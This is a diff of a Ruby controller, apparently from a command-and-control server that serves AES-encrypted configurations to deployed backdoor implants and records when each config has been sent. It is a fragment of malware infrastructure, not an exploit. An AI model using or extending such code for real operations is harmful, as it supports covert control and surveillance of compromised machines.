@@ -49,18 +49,24 @@ class BackdoorController < RESTController
 
 
   def config
+    backdoor = Item.where({_kind: 'backdoor', _mid: params['backdoor'].to_i}).first
+
     case @req_method
       when 'GET'
-        backdoor = Item.where({_kind: 'backdoor', _mid: params['backdoor'].to_i}).first
         config = backdoor.configs.where(:sent.exists => false).last
         return STATUS_NOT_FOUND if config.nil?
 
         # encrypt the config for the backdoor using the confkey
-        enc_content = aes_encrypt(config[:config], Digest::MD5.digest(backdoor[:confkey]))
+        json_config = JSON.parse(config[:config])
+        bson_config = BSON.serialize(json_config)
+        enc_config = aes_encrypt(bson_config.to_s, Digest::MD5.digest(backdoor[:confkey]))
 
-        return STATUS_OK, enc_content, 'binary/octet-stream'
-      when 'PUT'
-        DB.instance.backdoor_config_sent(params['backdoor'])
+        return STATUS_OK, enc_config, 'binary/octet-stream'
+
+      when 'DELETE'
+        config = backdoor.configs.where(:sent.exists => false).last
+        config.sent = Time.now.getutc.to_i
+        config.save
         trace :info, "[#{@req_peer}] Configuration sent [#{params['backdoor']}]"
     end
 
